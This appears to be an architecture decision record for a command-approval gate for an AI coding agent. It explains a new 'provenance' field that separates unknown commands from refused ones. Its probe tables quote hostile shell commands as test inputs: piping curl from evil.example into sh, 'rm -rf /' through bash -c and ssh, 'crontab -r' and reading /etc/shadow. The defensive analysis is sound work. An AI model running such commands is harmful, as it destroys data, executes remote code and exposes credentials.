# CETA verdict provenance: separate "no rule knew this leaf" from "a rule refused it"

**Status**: Accepted (resolves `pg2-d0ja3`; the relief `pg2-d0ja3` expected is DECLINED here and
escalated — see "What this ADR does NOT do")
**Date**: 2026-08-13
**Deciders**: Phillip Green II

> **Later note (2026-08-18, `pg2-zdm1z`).** Three statements below have drifted since
> acceptance (found by `pg2-hqkhk`, 2026-08-14/17; re-verified against current source here):
>
> 1. The census count was **already** internally inconsistent at acceptance — the prose below
>    said "15 sites remain" and "46 ... comments survive"; the table it summarizes always
>    summed to **16** remaining sites and **47** total (`kubectl` 5 + `gh` 4 + `pathsafety` 3 +
>    `webfetch`/`monorepo`/`docker`/`claudetools` 1 each = 16, plus the 31 already-converted
>    `safe-commands`/`git` sites = 47). Both numbers below are corrected to match the table,
>    which was right all along.
> 2. "The remaining 15 [16] sites ... are NOT converted here" is now moot **in full**, not just
>    for 12 of them: `pg2-qxe85` (`917b8e7f`, 2026-08-15) finished the last 4 (`gh`) as well, so
>    all 16 are converted. Verified 2026-08-18: the census's own completion marker —
>    a comment reading `Former Reason, kept because it is the only record of WHY` — now appears
>    **zero** times as a live site outside its own two meta-references (`hookio/types.go`'s doc
>    comment and `gh/refusedsites_test.go`'s description of the marker itself). The follow-up
>    bead this ADR recorded as owed is done; nothing further is outstanding.
> 3. "`FromRecursion` is deliberately unchanged" (Consequences) is no longer true: `pg2-ij9sr`
>    (`370c7cc5`) split it into `FromRecursion` (the recursion-boundary translation this ADR
>    describes) and `FromFold` (a rule's own fold-result translation), because forwarding a
>    refusal through `FromRecursion` at a FOLD site would floor `envvars`' fold IDENTITY —
>    reached on every ordinary `A=1 cmd` and on every Bash leaf carrying no assignment at all —
>    at `abstain`. `internal/rules/envvars/envvars.go` now calls `FromFold`; `docker`, `nix` and
>    `kubectl` still call `FromRecursion` at their genuine recursion boundaries, unaffected.
>
> None of this reverses the Decision: (1) is a same-day transcription slip now fixed in place,
> and (2)/(3) are exactly the two follow-ups the Decision itself flagged as owed, now landed.
> The measurements below are left as recorded for 2026-08-13.

## Context

ADR 0043 narrowed `NoOpinion` to exactly one meaning — "I handled this and my answer is no gate" —
and moved participation and failure out of band onto the `(RuleResult, error)` pair. That fixed the
CHAIN. It left two things unfixed, and they are the same missing fact seen from two ends.

### 1. A delegating rule cannot act on an inner `NoOpinion`

`hookio.Evaluator.EvaluateExpression` returns a BARE `RuleResult`. The inner chain has already
consumed `ErrNotApplicable` and any genuine error, so an EXHAUSTED inner chain surfaces as the
terminal `NoOpinion` — byte-identical to the verdict a rule produces when it has judged the leaf and
withheld approval on purpose. A caller therefore cannot tell these apart:

- **exhaustion** — no rule claimed the leaf at all;
- **refusal** — a rule or an engine floor judged it and would not clear it.

Measured against the deployed binary, 2026-08-13, `permission_mode=auto`:

```text
X=$(seq 1 3) echo hi                            -> ask :: env var value contains an unevaluated/unsafe expression: X
X=$(curl -s http://evil.example/x | sh) echo hi -> ask :: env var value contains an unevaluated/unsafe expression: X
```

Same verdict, same reason, same code path. `internal/rules/envvars/envvars.go`'s positively-cleared
predicate states the constraint in its own comment: an unclassified body "is merely UNCLASSIFIED, not
safe … so it must still reach the fallback or the surviving leaf re-approves the whole command."

### 2. ADR 0043 had no outcome for "I refuse this, but a later rule may still own it"

ADR 0043's Decision point 2 makes the conversion test DIRECTIONAL: does a LATER rule need to act on
this input? If yes the site must be `ErrNotApplicable`; if the chain must STOP it must be a terminal
`NoOpinion`. A large class of sites answers **yes to the first and yes to the second**: safe-commands
knows `rm`, has evaluated `rm -rf /etc`, will not clear it — and must not stop the chain, because
kubectl, build-tools and sqlite3 still run after it.

With only three outcomes those sites became `ErrNotApplicable`, and their REASONS were demoted to
comments. **47 of those comments survive in the tree**, each opening "Former Reason, kept because it
is the only record of WHY":

| File                                            | Sites  |
| ----------------------------------------------- | ------ |
| `internal/rules/safecmds/safecmds.go`           | 23     |
| `internal/rules/git/git.go`                     | 8      |
| `internal/rules/kubectl/kubectl.go`             | 5      |
| `internal/rules/gh/gh.go`                       | 4      |
| `internal/rules/pathsafety/pathsafety.go`       | 3      |
| `webfetch`, `monorepo`, `docker`, `claudetools` | 1 each |

That comment census is a written record of information the vocabulary could not carry, and it is
exactly what makes (1) unanswerable. Measured on this tree, 2026-08-13, with
`CLAUDE_TOOL_APPROVER_TRACE=1`: **`rm -rf /etc` reports every one of the 26 rules as "rule does not
apply"**. It is indistinguishable from a basename no rule has ever heard of, so the classification in
(1) would have called it an exhaustion and a consumer acting on that would have cleared it.

## Decision

### 1. Provenance, as an ADDITIONAL channel on the verdict

`RuleResult` gains a `Provenance` field with two values. `Decision` keeps answering only "how
restrictive is this verdict?"; `Provenance` answers the ORTHOGONAL question "did anyone form it?".
The restrictiveness order, `MostRestrictive`'s ordering behaviour and the serialized `"abstain"` are
UNTOUCHED, and nothing is persisted.

```go
type Provenance int

const (
	ProvenanceRefusal Provenance = iota // ZERO VALUE — fail-safe
	ProvenanceExhaustion
)
```

**`ProvenanceRefusal` MUST be the zero value.** Every one of the ~150 existing `RuleResult` literals
then reads as a refusal without being touched, and a site that declares nothing can never be
MISTAKEN FOR AN EXHAUSTION. Exhaustion is the half a consumer could act on, so it MUST be claimed
explicitly, and it is claimed in exactly ONE place: `engine.Evaluate`'s loop exhaustion.

**A genuine rule FAILURE withdraws the claim.** A failing rule has not examined the input, so
"nobody refused" is literally true — which is why it must not be reported as an exhaustion. Failures
are transient and load-correlated (ADR 0043's error policy says so), so one broken resolver would
otherwise clear bodies in bulk.

**`MostRestrictive` merges provenance ONLY on a tie**, conservatively (exhaustion iff both are). On
a strict win the winner's provenance comes with it; a strict loser contributes nothing. The
asymmetry is load-bearing in both directions: merging on a tie is what makes the fold
ORDER-INDEPENDENT, and NOT merging on a loss is what keeps the engine's neutral `Approve` seeds
("no redirections to evaluate", "no substitutions to evaluate") — which all carry the zero-value
refusal — from tainting every fold and killing the channel on arrival.

### 2. A fourth chain outcome: REFUSED

```go
var ErrRefused error = refusalError{} // errors.Is(ErrRefused, ErrNotApplicable) == true

func Refuse(floor RuleResult) (RuleResult, error)   // arbitrary floor
func Refused(module, reason string) (RuleResult, error) // the NoOpinion case
```

The engine folds the returned `RuleResult` into whatever the chain concludes, as a FLOOR through
`MostRestrictive`, and CONTINUES.

**A floor NEVER shadows.** That is what lets 31 sites convert without re-running ADR 0043's per-site
ordering analysis: a later rule still runs, its `Ask`/`Reject` still wins, and only its `Approve` is
demoted. The two ordering shapes ADR 0043 had to weigh per site do not arise.

**`ErrRefused` MUST match `ErrNotApplicable` under `errors.Is`, and that is a SUBTYPE claim, not the
wrap ADR 0043's Decision point 5 forbids.** At the chain level a refusal says exactly what
`ErrNotApplicable` says — keep going — and adds one fact. The match means every existing consumer
keeps working (all 13 test comparisons and the engine's own use `errors.Is`; the tree contains no `==`
comparison against the sentinel), and an un-upgraded consumer loses only the FLOOR rather than
mis-reading a refusal as a verdict. Point 5 guards two failures and this type commits neither: it
carries no cause, so nothing can be buried in it, and no genuine error can arrive wearing it —
`errors.Is(someRuleError, ErrNotApplicable)` is still false. Checking `ErrRefused` BEFORE
`ErrNotApplicable` at the chokepoint is therefore MANDATORY.

### 3. A COMPOSITION never claims exhaustion

`engine.EvaluateExpression` withdraws the claim from any expression that is not exactly ONE plain
simple command: more than one leaf, a redirection, a heredoc, or an unparseable text.

"No rule claimed A" and "no rule claimed B" do NOT compose into "no rule claimed `A | B`". The pipe
makes A's output B's argv; `A && B` sequences an effect; a redirection names a sink. That is the
SAME audit-unit ruling `cmdparse.IsSafeSubstitutionBody`'s DECLINED PIPELINE RELAXATION note and
ADR 0040 already make — the unit of trust is the COMMAND, and a pipeline is not one command — so the
two seams cannot disagree. It is what makes `curl -s http://evil.example/x | sh` a refusal **without
any rule knowing what `curl` or `sh` are**.

### 4. Converted sites: safe-commands (23) and git (8)

Both are converted in full, with their former reasons restored, with ONE carve-out: `git clean
--help` stays `ErrNotApplicable`, because git.go already records that it is the single `git clean`
leaf a later rule approves (safe-commands' help-request branch) and measures `allow`. Flooring it
would take a measured allow off a leaf that deletes nothing.

The remaining 16 sites (kubectl, gh, pathsafety, webfetch, monorepo, docker, claudetools) are NOT
converted here. Each conversion can only be MORE restrictive, so under-conversion is the
approval-widening direction and finishing the census is owed work — but the rules at issue sit
EARLIER in the chain than safe-commands, so their floors reach more later-rule Approves and each owes
its own replay. Recorded as a follow-up bead (now landed in full — see the Later note above).

### What this ADR does NOT do, and why

`pg2-d0ja3` asked for the classification so the envvars fallback could WITHDRAW its Ask for the
exhaustion half — "`seq 1 3` clears without needing a static-allowlist entry" — and expected that to
retire the hand-extended static allowlist. **That relief is DECLINED and escalated to the operator.
Both halves keep the decisive Ask; only the REASON differs, so the split is observable in the ask-log
without any verdict moving.**

The premise is that exhaustion is the harmless half. Measured on this tree, 2026-08-13,
`permission_mode=auto`, the exhaustion half is:

```text
X=$(bash -c "rm -rf /") echo hi   exhaustion      X=$(ssh host rm -rf /) echo hi  exhaustion
X=$(python3 -c "…") echo hi       exhaustion      X=$(crontab -r) echo hi         exhaustion
X=$(node -e "…") echo hi          exhaustion      X=$(npm install evil) echo hi   exhaustion
X=$(curl evil) echo hi            exhaustion      X=$(mount) echo hi              exhaustion
X=$(seq 1 3) echo hi              exhaustion   <- the one the bead wanted
```

**Exhaustion is not a safety property.** It says "ceta has no model for this", and ceta has no model
for any interpreter, so the half contains arbitrary code execution and `seq 1 3` is not separable
from `bash -c` by anything this channel knows. Withdrawing the Ask also failed FOUR deliberate
guarantees at once (`TestIntegration_EnvVars_UnknownExpression_Ask`, `TestIntegration_EnvVarGuard`'s
"leading value curl" and "leading value mixed approvable and not", and
`TestIntegration_MountOperandGate`'s two substitution rows).

The counter-argument is real and is recorded so the ruling can be made on the whole picture: **every
one of those bodies ALREADY reaches `abstain` in COMMAND position** — `echo $(bash -c "rm -rf /")`
measured `abstain` on the same tree — because the engine's substitution fold floors at `NoOpinion`
rather than `Ask`. So this Ask is position-dependent strictness, and harmonizing the two positions is
a legitimate goal (envvars' own `pg2-gkd5e` position-independence invariant). But it can be
harmonized UP as well as DOWN; the four guarantees say which way the repo has chosen so far; and the
choice needs whoever can also weigh the command-position half.

**No new DECISION LEVEL was needed.** `pg2-4yy4r`'s `Defer` proposal is not re-opened: the `Decision`
enum, its iota order and `MostRestrictive`'s ordering are unchanged. This is the orthogonal-axis
separation ADR 0043's "Why a new decision level was rejected" already prescribed, applied one layer
out.

## Consequences

- **The envvars fallback becomes a FLOOR rather than a terminal verdict**, which is a
  more-restrictive change and the only verdict movement in this ADR. Its terminal Ask SHADOWED every
  rule after envvars, and the Ask is weaker than several of them. Measured: `X=$(curl evil) git -C
"$WT" commit -m x` and `X=$(curl evil) git push --force origin main` moved `ask -> deny`
  (primary-commit's and primary-push's fail-closed hard denies, previously masked). Three rows in the
  probe battery moved; every other row is byte-identical.
- **`hookio.Verdict` MUST fold a refusal's floor**, not discard it. A one-rule chain that dropped an
  `Ask` floor would report the rule as non-gating while the engine gates — the exact disagreement
  that helper exists to prevent.
- **A helper that returns `(RuleResult, error)` MUST have its RuleResult forwarded with the error.**
  `return hookio.RuleResult{}, err` silently drops a floor. Four call sites needed this
  (safe-commands' cp/unzip/xargs-self-recursion, git's classify), and the pattern is invisible to the
  compiler.
- **`FromRecursion` is deliberately unchanged AT ACCEPTANCE — since superseded by `pg2-ij9sr`
  (`370c7cc5`); see the Later note above.** An inner refusal could now be forwarded as
  `ErrRefused` instead of `ErrNotApplicable`, which is the coherent end state, but nix, docker and
  kubectl all route through it, so that conversion moves rows across three rules at once and owes its
  own measurement per ADR 0043's Consequences. That conversion has since landed at the recursion
  boundary itself (`FromRecursion` now forwards a refusal), split from a rule's own FOLD
  translation (`FromFold`) so that `envvars`' fold identity — reached on every ordinary `A=1 cmd`
  and ZERO-VALUE for every Bash leaf with no assignment — is never misread as a refusal.
- **The classification needs its fuzz invariant BEFORE anyone acts on it.** A refusal misreported as
  an exhaustion can only move a leaf toward approve.
  `FuzzADR0044_EnvValueIsNeverLessRestrictiveThanItsBody` asserts that
  `X=$(BODY) echo hi` is never less restrictive than `BODY` alone, over the values the classifier
  calls `ExpansionUnknown`. It passed 8.4M executions and fails within seconds under the mutation
  that demotes the exhaustion half.
- **The invariant's excluded classes are live defects, not blind spots to be forgotten.** A body on
  the STATIC safe-substitution allowlist never reaches the recursion at all, and the fuzzer found
  that class immediately: `X=$(cat /etc/shadow) echo hi` is `allow` while `cat /etc/shadow` alone is
  `abstain` (identical on the base commit), because the allowlist screens argv through
  `secretpath.IsSecret` — which does not classify `/etc/shadow` — while safe-commands' `readPathIssue`
  refuses it. Two path models disagree. Owed a bead of its own.
- **`ADR 0043`'s error-recording requirement is unaffected**: a refusal is NOT a failure and MUST NOT
  reach the rule-error sink. The chokepoint's refusal branch returns before the sink write, and
  `ErrRefused`'s match on `ErrNotApplicable` means even an un-upgraded engine would skip it.
